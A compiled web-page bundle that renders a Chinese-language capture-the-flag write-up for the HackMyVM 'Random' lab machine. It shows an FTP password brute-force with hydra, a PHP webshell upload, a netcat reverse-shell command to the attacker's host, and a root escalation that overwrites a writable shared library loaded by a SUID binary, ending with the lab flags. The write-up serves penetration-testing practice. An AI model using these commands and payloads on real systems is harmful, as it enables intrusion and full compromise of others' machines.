"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[1169],{48120:(e,n,a)=>{a.r(n),a.d(n,{assets:()=>d,contentTitle:()=>o,default:()=>h,frontMatter:()=>l,metadata:()=>r,toc:()=>i});const r=JSON.parse('{"id":"HackMyVM/Machines/Random/index","title":"Random","description":"[Linux VM] [Tested on VirtualBox] created by || sml","source":"@site/docs/HackMyVM/Machines/Random/index.md","sourceDirName":"HackMyVM/Machines/Random","slug":"/HackMyVM/Machines/Random/","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Random/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackMyVM/Machines/Random/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackMyVM_Sidebar","previous":{"title":"Pwned","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/Pwned/"},"next":{"title":"RoosterRun","permalink":"/Target-Machines-WriteUp/docs/HackMyVM/Machines/RoosterRun/"}}');var t=a(74848),s=a(28453);const l={},o="Random",d={},i=[{value:"\u9776\u673a\u542f\u52a8",id:"\u9776\u673a\u542f\u52a8",level:2},{value:"nmap \u4fe1\u606f\u641c\u96c6",id:"nmap-\u4fe1\u606f\u641c\u96c6",level:2},{value:"ftp \u533f\u540d\u767b\u9646",id:"ftp-\u533f\u540d\u767b\u9646",level:2},{value:"web \u670d\u52a1",id:"web-\u670d\u52a1",level:2},{value:"User - www-data",id:"user---www-data",level:2},{value:"\u73af\u5883\u63a2\u6d4b",id:"\u73af\u5883\u63a2\u6d4b",level:3},{value:"<code>random</code> \u7a0b\u5e8f\u9006\u5411\u5206\u6790",id:"random-\u7a0b\u5e8f\u9006\u5411\u5206\u6790",level:2},{value:"User - root",id:"user---root",level:2},{value:"flag- user",id:"flag--user",level:3},{value:"flag - root",id:"flag---root",level:3}];function c(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",p:"p",pre:"pre",...(0,s.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"random",children:"Random"})}),"\n",(0,t.jsxs)(n.admonition,{type:"note",children:[(0,t.jsx)(n.p,{children:"[Linux VM] [Tested on VirtualBox] created by || sml"}),(0,t.jsx)(n.p,{children:"\u23f2\ufe0f Release Date // 2020-10-19"}),(0,t.jsx)(n.p,{children:"\u2714\ufe0f MD5 // 594d83108b972529c3d03abf5249febc"}),(0,t.jsx)(n.p,{children:"\u2620 Root // 34"}),(0,t.jsx)(n.p,{children:"\ud83d\udc80 User // 38"}),(0,t.jsx)(n.p,{children:"\ud83d\udcddNotes //\nHack and Fun. Tested on Virtualbox."})]}),"\n",(0,t.jsx)(n.h2,{id:"\u9776\u673a\u542f\u52a8",children:"\u9776\u673a\u542f\u52a8"}),"\n",(0,t.jsx)(n.p,{children:"\u9776\u673a IP"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"192.168.56.112\n"})}),"\n",(0,t.jsx)(n.h2,{id:"nmap-\u4fe1\u606f\u641c\u96c6",children:"nmap \u4fe1\u606f\u641c\u96c6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",children:"21/tcp open  ftp     vsftpd 3.0.3\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxr-xr--    2 1001     33           4096 Oct 19  2020 html\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:192.168.56.102\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 4\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\n| ssh-hostkey:\n|   2048 09:0e:11:1f:72:0e:6c:10:18:55:1a:73:a5:4b:e5:64 (RSA)\n|   256 c0:9f:66:34:56:1d:16:4a:32:ad:25:0c:8b:a0:1b:5a (ECDSA)\n|_  256 4c:95:57:f4:38:a3:ce:ae:f0:e2:a6:d9:71:42:07:c5 (ED25519)\n80/tcp open  http    nginx 1.14.2\n|_http-server-header: nginx/1.14.2\n|_http-title: Site doesn't have a title (text/html).\n"})}),"\n",(0,t.jsx)(n.h2,{id:"ftp-\u533f\u540d\u767b\u9646",children:"ftp \u533f\u540d\u767b\u9646"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\n229 Entering Extended Passive Mode (|||56972|)\n150 Here comes the directory listing.\ndrwxr-xr-x    3 0        113          4096 Oct 19  2020 .\ndrwxr-xr-x    3 0        113          4096 Oct 19  2020 ..\ndrwxr-xr--    2 1001     33           4096 Oct 19  2020 html\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u5b58\u5728\u4e00\u4e2a ",(0,t.jsx)(n.code,{children:"html"})," \u76ee\u5f55\uff0c\u4f46\u662f\u65e0\u6cd5\u8fdb\u5165"]}),"\n",(0,t.jsx)(n.h2,{id:"web-\u670d\u52a1",children:"web \u670d\u52a1"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-html",children:"<pre>\n#########################WARNING##########################\neleanor, i disabled your ssh access.\nTake care.\n-alan\n##########################################################\n</pre>\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u7531\u4e8e SSH \u670d\u52a1\u88ab\u7981\u7528\uff0c\u5c1d\u8bd5\u7206\u7834 ftp"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $hydra -v -V -I -l eleanor -P /usr/share/wordlists/rockyou.txt 192.168.56.112 ftp\n[21][ftp] host: 192.168.56.112   login: eleanor   password: ladybug\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u767b\u9646\u4e0a\u53bb\u4e4b\u540e\uff0c\u6210\u529f\u63a7\u5236 ftp \u670d\u52a1\uff0c\u4f46\u662f\u8fd8\u662f\u65e0\u6cd5\u4e0a\u4f20\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"ftp> ls -lah\n229 Entering Extended Passive Mode (|||10520|)\n150 Here comes the directory listing.\ndrwxr-xr--    2 1001     33           4096 Oct 19  2020 .\ndrwxr-xr-x    3 0        113          4096 Oct 19  2020 ..\n-rw-r--r--    1 33       33            185 Oct 19  2020 index.html\n226 Directory send OK.\nftp> put simple-backdoor.php\nlocal: simple-backdoor.php remote: simple-backdoor.php\n229 Entering Extended Passive Mode (|||59495|)\n550 Permission denied.\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u66f4\u6362\u4e3a sftp\uff0c\u6210\u529f\u4e0a\u4f20\u6587\u4ef6"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"sftp> ls -lah\ndrwxr-xr-x    ? 0        113          4.0K Oct 20  2020 .\ndrwxr-xr-x    ? 0        113          4.0K Oct 20  2020 ..\ndrwxr-xr--    ? 1001     33           4.0K Oct 20  2020 html\nsftp> cd html\nsftp> put simple-backdoor.php\nUploading simple-backdoor.php to /html/simple-backdoor.php\nsimple-backdoor.php\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u8c03\u7528 webshell"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="http://192.168.56.112/simple-backdoor.php?cmd=whoami"',children:"www-data\n"})}),"\n",(0,t.jsx)(n.h2,{id:"user---www-data",children:"User - www-data"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"# http://192.168.56.112/simple-backdoor.php?cmd=nc+-c+bash+192.168.56.102+9999\n\u250c\u2500[randark@parrot]\u2500[~/tmp]\n\u2514\u2500\u2500\u257c $pwncat-cs -lp 9999\n[17:45:29] Welcome to pwncat \ud83d\udc08!\n[17:45:53] received connection from 192.168.56.112:56462\n[17:45:54] 192.168.56.112:56462: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@random:/srv/ftp/html$ whoami\nwww-data\n"})}),"\n",(0,t.jsx)(n.h3,{id:"\u73af\u5883\u63a2\u6d4b",children:"\u73af\u5883\u63a2\u6d4b"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-plaintext",metastring:'title="ls -lah /home/alan/"',children:"total 56K\ndrwxr-xr-x 2 alan alan 4.0K Oct 19  2020 .\ndrwxr-xr-x 4 root root 4.0K Oct 19  2020 ..\n-rw------- 1 alan alan   52 Oct 19  2020 .Xauthority\n-rw-r--r-- 1 alan alan  220 Oct 19  2020 .bash_logout\n-rw-r--r-- 1 alan alan 3.5K Oct 19  2020 .bashrc\n-rw-r--r-- 1 alan alan  807 Oct 19  2020 .profile\n-rw------- 1 alan alan  162 Oct 19  2020 note.txt\n-rwsr-sr-x 1 root root  17K Oct 19  2020 random\n-rw-r--r-- 1 root root   19 Oct 19  2020 root.h\n-rw-r--r-- 1 root root 1.6K Oct 19  2020 rooter.o\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u53d1\u73b0\u4e00\u4e2a suid \u7a0b\u5e8f\uff0c\u5c1d\u8bd5\u6267\u884c"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@random:/home/alan$ ./random\nSegmentation fault\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u4e0b\u8f7d\u4e0b\u6765\u5206\u6790"}),"\n",(0,t.jsxs)(n.h2,{id:"random-\u7a0b\u5e8f\u9006\u5411\u5206\u6790",children:[(0,t.jsx)(n.code,{children:"random"})," \u7a0b\u5e8f\u9006\u5411\u5206\u6790"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'int __fastcall main(int argc, const char **argv, const char **envp)\n{\n  time_t v3; // rdi\n  int v5; // [rsp+1Ch] [rbp-4h]\n\n  v5 = atoi(argv[1]);\n  v3 = time(0LL);\n  srand(v3);\n  if (v5 == rand() % 9 + 1 )\n    makemeroot(v3);\n  else\n    puts("Wrong number");\n  return 0;\n}\n'})}),"\n",(0,t.jsxs)(n.p,{children:["\u90a3\u7b80\u5355\uff0c\u7531\u4e8e ",(0,t.jsx)(n.code,{children:"rand() % 9 + 1"})," \u7684\u9650\u5236\uff0c\u76f4\u63a5\u75af\u72c2\u8fd0\u884c\uff0c\u603b\u6709\u80fd\u5bf9\u7684\u4e0a\u7684\u65f6\u5019"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@random:/home/alan$ ./random 1\nSUCCESS!! But I need to finish and implement this function\n"})}),"\n",(0,t.jsx)(n.p,{children:"\u5c1d\u8bd5\u5206\u6790\u8fd9\u4e2a\u7a0b\u5e8f\u7684\u94fe\u63a5\u5e93"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@random:/home/alan$ ldd random\n        linux-vdso.so.1 (0x00007ffd259e8000)\n        librooter.so => /lib/librooter.so (0x00007f23db669000)\n        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f23db4a8000)\n        /lib64/ld-linux-x86-64.so.2 (0x00007f23db67a000)\n"})}),"\n",(0,t.jsxs)(n.p,{children:["\u7ecf\u8fc7\u63a2\u6d4b\uff0c",(0,t.jsx)(n.code,{children:"/lib/librooter.so"})," \u8fd9\u4e2a\u94fe\u63a5\u5e93\u53ef\u63a7\uff0c\u4e8e\u662f\u53ef\u4ee5\u5c1d\u8bd5\u8986\u76d6"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-c",children:'#include <stdlib.h>\n\nvoid makemeroot()\n{\n        setuid(0);\n        setgid(0);\n        system("/bin/bash");\n}\n'})}),"\n",(0,t.jsxs)(n.admonition,{type:"warning",children:[(0,t.jsxs)(n.p,{children:["\u8fdc\u7a0b\u9776\u673a\u73af\u5883\u4e2d\u7684 ",(0,t.jsx)(n.code,{children:"ld"})," \u6709\u95ee\u9898\uff0c\u4f1a\u51fa\u73b0"]}),(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@random:/tmp$ gcc -shared shell.c -o /lib/librooter.so\nshell.c: In function 'makemeroot':\nshell.c:5:2: warning: implicit declaration of function 'setuid'; did you mean 'setenv'? [-Wimplicit-function-declaration]\n  setuid(0);\n  ^~~~~~\n  setenv\nshell.c:6:2: warning: implicit declaration of function 'setgid'; did you mean 'setenv'? [-Wimplicit-function-declaration]\n  setgid(0);\n  ^~~~~~\n  setenv\ncollect2: fatal error: cannot find 'ld'\ncompilation terminated.\n"})}),(0,t.jsx)(n.p,{children:"\u5efa\u8bae\u4f7f\u7528\u672c\u5730\u7f16\u8bd1\u597d\u7684\u7ed3\u679c\u8fdb\u884c\u4e0a\u4f20"})]}),"\n",(0,t.jsxs)(n.p,{children:["\u7136\u540e\u7ee7\u7eed\u5c1d\u8bd5\u8fd0\u884c ",(0,t.jsx)(n.code,{children:"random"})," \u7a0b\u5e8f"]}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@random:/home/alan$ ./random 8\nroot@random:/home/alan# whoami\nroot\n"})}),"\n",(0,t.jsx)(n.admonition,{type:"note",children:(0,t.jsx)(n.p,{children:"\u6709\u4e2a\u95ee\u9898\uff0c\u8fd9\u600e\u4e48\u5c31\u76f4\u63a5\u63d0\u6743\u5230 root \u4e86\uff0c\u8fd9\u4e0d\u592a\u79d1\u5b66\u3002\u3002\u3002"})}),"\n",(0,t.jsx)(n.h2,{id:"user---root",children:"User - root"}),"\n",(0,t.jsx)(n.h3,{id:"flag--user",children:"flag- user"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"root@random:/home/eleanor# cat user.txt\nihavethapowah\n"})}),"\n",(0,t.jsx)(n.h3,{id:"flag---root",children:"flag - root"}),"\n",(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-shell",children:"root@random:/root# cat root.txt\nhowiarrivedhere\n"})})]})}function h(e={}){const{wrapper:n}={...(0,s.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(c,{...e})}):c(e)}},28453:(e,n,a)=>{a.d(n,{R:()=>l,x:()=>o});var r=a(96540);const t={},s=r.createContext(t);function l(e){const n=r.useContext(s);return r.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function o(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),r.createElement(s.Provider,{value:n},e.children)}}}]);